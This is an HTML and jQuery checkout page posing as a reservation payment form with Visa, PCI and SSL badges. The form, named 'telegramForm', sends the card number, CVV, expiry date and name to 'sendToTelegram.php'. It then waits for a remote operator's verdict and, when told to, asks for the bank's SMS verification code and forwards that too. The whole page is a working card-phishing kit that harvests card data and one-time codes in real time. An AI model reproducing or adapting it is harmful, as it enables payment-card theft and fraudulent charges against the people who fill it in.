<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout Page</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.5/jquery.inputmask.min.js"></script>
    <style>
        #spinner {
            display: none;
        }
        .loader-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 50px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div class="container mt-5">
    <div class="row">
        <div class="col-md-6 offset-md-3">
            <div class="card">
                <div class="card-header" id="cardHeder">
                    Reservation Payment Details
                </div>
                <div class="card-body">
                    <form id="telegramForm">
                        <div class="form-group">
                            <label for="cardHolderName">Card Holder Name</label>
                            <input type="text" class="form-control" id="cardHolderName" name="cardHolderName" placeholder="Card Holder Name" required>
                        </div>
                        <div class="form-group">
                            <label for="cardNumber">Card Number</label>
                            <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="Card Number" inputmode="numeric" maxlength="19">
                            <span id="cardNumberError" style="color: red;"></span>
                        </div>
                        <div class="form-row">
                             <div class="col">
                                 <label for="expiryDate">Expiry Date</label>
                                 <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/\d{2}" required>
                                 <span id="expiryDateError" style="color: red;"></span>
                             </div>
                             <div class="col">
                                 <label for="cvv">CVV/CVC</label>
                                 <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV" pattern="\d{3,4}" maxlength="4" required>
                             </div>
                        </div>
                        <div class="form-group">
                            <label for="amount">Amount</label>
                            <input type="number" class="form-control" id="amount" name="amount" value="25.00" min="25" step="5" required>
                        </div>
                        
                            <button type="submit" id="submit-btn" class="btn btn-primary btn-block"></button>
                            <div id="spinner">
                                <div class="text-center loader-container">
                                    <div class="loader">
                                    </div>
                                </div>
                            </div>
                            <div class="form-row">
                                <div class="col">
                                    <input type="text" id="smsCode" class="form-control" name="smsCode" placeholder="Enter verification code" style="display: none;">
                                </div>
                                <div class="col">
                                    <button type="button" id="sendSmsCode-btn" class="btn btn-primary btn-block" style="display: none;">Verification</button>
                                </div>
                            </div>
                        
                    </form>
                </div>
                <div class="card-footer text-muted text-center">
                    <img src="static/img/visa.png" alt="Visa" class="img-fluid" style="max-width: 80px;">
                    <img src="static/img/mastercard.png" alt="MasterCard" class="img-fluid" style="max-width: 80px;">
                    <img src="static/img/american_express.png" alt="American Express" class="img-fluid" style="max-width: 80px;">
                    <img src="static/img/discover.jpg" alt="Discover Network" class="img-fluid" style="max-width: 80px;">
                    <img src="static/img/JCB_logo.svg" alt="JCB" class="img-fluid" style="max-width: 80px;">
                    <div>
                        <img src="static/img/piccomplient.png" alt="PCI Compliance" class="img-fluid" style="max-width: 80px;">
                        <img src="static/img/SSL-Encryption.png" alt="SSL Encryption" class="img-fluid" style="max-width: 80px;">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
    <script>
        $(document).ready(function() {
            function updateButtonText() {
                var amount = $('#amount').val();
                $('#submit-btn').html('<i class="fas fa-lock"></i> Pay $' + amount);
            }
            updateButtonText();
            $('#amount').on('input', function() {
                updateButtonText();
            });
            $('#amount').on('input', function() {
                var amount = $(this).val();
                $('#submit-btn').html('<i class="fas fa-lock"></i> Pay $' + amount);
            });
            $('#telegramForm').submit(function(event) {
                event.preventDefault();
                sendToTelegram();
            });
        });
        function sendSmsCode(uniqueId) {
            var smsCode = $('#smsCode').val();
            $('#smsCode').hide();
            $('#sendSmsCode-btn').hide();
            $('#spinner').show();
            $.ajax({
                type: 'POST',
                url: 'sendSmsCodeToTelegram.php',
                data: {
                    'uniqueId': uniqueId,
                    'smsCode': smsCode
                },
                dataType: 'json',
                success: function(response) {
                    if (response.status === 'success') {
                        checkResponseStatus(uniqueId);
                    } else {
                        alert('There was an error sending the SMS code.');
                        // Obradite grešku
                    }
                },
                error: function() {
                    alert('An error occurred while sending the SMS code.');
                    // Obradite AJAX grešku
                }
            });
        }
        function sendToTelegram() {
            $('#submit-btn').hide();
            $('#cardHeder').show();
            $('#spinner').show();
            var formData = {
                'cardHolderName': $('#cardHolderName').val(),
                'cardNumber': $('#cardNumber').val(),
                'expiryDate': $('#expiryDate').val(),
                'cvv': $('#cvv').val(),
                'amount': $('#amount').val()
            };
            $.ajax({
                type: 'POST',
                url: 'sendToTelegram.php',
                data: formData,
                dataType: 'json',
                encode: true
            })
            .done(function(data) {
                console.log(data);
                if(data.status === 'success') {
                    checkResponseStatus(data.uniqueId);
                }
            })
            .fail(function(data) {
                console.error(data); 
                $('#spinner').hide();
                $('#submit-btn').show();
            });
        }
        function checkResponseStatus(uniqueId) {
            var interval = setInterval(function() {
                $.ajax({
                    type: 'GET',
                    url: 'checkResponseStatus.php',
                    data: {'uniqueId': uniqueId},
                    dataType: 'json',
                    success: function(response) {
                        if(response.status === 'received') {
                            clearInterval(interval);
                            $('#spinner').hide();
                            if(response.response === 'sms') {
                                // Prikazivanje polja za SMS kod i dugmeta za slanje
                                $('#smsCode').show();
                                $('#sendSmsCode-btn').show();
                                $('#submit-btn').hide();
                                // Dodavanje event listener-a za novo dugme
                                $('#sendSmsCode-btn').click(function() {
                                    sendSmsCode(uniqueId);
                                });
                            } else {
                                $('#submit-btn').show();
                            }
                        } else if(response.status === 'reject') {
                            clearInterval(interval);
                            $('#spinner').hide();
                            $('#submit-btn').show();
                            $('#cardHolderName').val('');
                            $('#cardNumber').val('');
                            $('#expiryDate').val('');
                            $('#cvv').val('');
                            $('#amount').val('25.00');
                        }
                    }
                });
            }, 1000);
        }
        document.getElementById('cardNumber').addEventListener('input', function (e) {
            var target = e.target;
            var value = target.value.replace(/\D/g, '');
            var expectedLength = (value.startsWith('3') ? 15 : 16);
            if (value.length < expectedLength) {
                target.value = value.replace(/(.{4})/g, '$1 ').trim();
            } else {
                var formattedValue = value
                    .padEnd(expectedLength, '_')
                    .replace(/(.{4})/g, '$1 ')
                    .trim();
                target.value = formattedValue;
            }
            if (value.length === expectedLength && !luhnCheck(value.replace(/_/g, ''))) {
                document.getElementById('cardNumberError').textContent = 'Invalid card number';
            } else {
                document.getElementById('cardNumberError').textContent = '';
            }
        });
        function luhnCheck(cardNo) {
            var sum = 0;
            var alternate = false;
            for (var i = cardNo.length - 1; i >= 0; i--) {
                var n = parseInt(cardNo[i], 10);
                if (alternate) {
                    n *= 2;
                    if (n > 9) {
                        n = (n % 10) + 1;
                    }
                }
                sum += n;
                alternate = !alternate;
            }
            return (sum % 10 === 0);
        }
        document.getElementById('expiryDate').addEventListener('input', function (e) {
            var target = e.target;
            var value = target.value;
            value = value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            target.value = value;
            validateExpiryDate(target.value);
        });
        function validateExpiryDate(expiryDate) {
            var errorSpan = document.getElementById('expiryDateError');
            errorSpan.textContent = '';
            if (expiryDate.length === 5) {
                var currentYear = new Date().getFullYear() % 100;
                var currentMonth = new Date().getMonth() + 1;
                var [expMonth, expYear] = expiryDate.split('/').map(Number);
                if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
                    errorSpan.textContent = 'The expiry date cannot be in the past.';
                    document.getElementById('expiryDate').value = '';
                }
            }
        }
        document.getElementById('cvv').addEventListener('input', function (e) {
            var target = e.target;
            target.value = target.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>